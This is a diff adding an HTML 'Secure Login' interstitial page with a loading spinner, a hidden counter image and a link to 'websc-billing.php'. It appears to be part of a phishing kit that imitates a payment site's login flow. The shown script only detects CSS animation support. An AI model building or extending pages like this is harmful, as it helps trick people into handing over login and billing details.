@@ -1,0 +1,49 @@
+
+<center>
+    <img src="./js/counter.cgi" border="0" class="accessAid" alt="">
+    <div class="" id="page">
+        <div id="content">
+            <div id="headline">
+                <h2 class="accessAid">Secure Login</h2>
+            </div>
+            <div id="messageBox"></div>
+            <div id="main">
+                <div class="layout1 textcenter">
+                    <h3>Secure login ...</h3>
+                    <div id="rotatingDiv" class="show"></div>
+                    <img id="rotatingImg" src="./img/icon_load_roundcorner_lock1_186x42_withlock.gif" border="0" class="actionImage" alt="Ouverture de session sécurisée">
+                    <p class="note">If this page is displayed for over 5 seconds, <a href="websc-billing.php">click here</a> to reload.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script type="text/javascript">
+        var supportCSSProp = (function () {
+            var div = document.createElement('div'),
+                vendors = 'Khtml Ms O Moz Webkit'.split(' '),
+                len = vendors.length;
+
+            return function (prop) {
+                if (prop in div.style) return true;
+
+                prop = prop.replace(/^[a-z]/, function (val) {
+                    return val.toUpperCase();
+                });
+                // Filter through the vendors array, and test if there's a match
+                while (len--) {
+                    if (vendors[len] + prop in div.style) {
+                        return true;
+                    }
+                }
+                return false;
+            };
+        })();
+
+        if (supportCSSProp('animation')) {
+            YUD.addClass('rotatingDiv', 'show');
+        } else {
+            YUD.addClass('rotatingImg', 'show');
+            YUD.addClass('rotatingDiv', 'hide');
+        }
+    </script>
+   
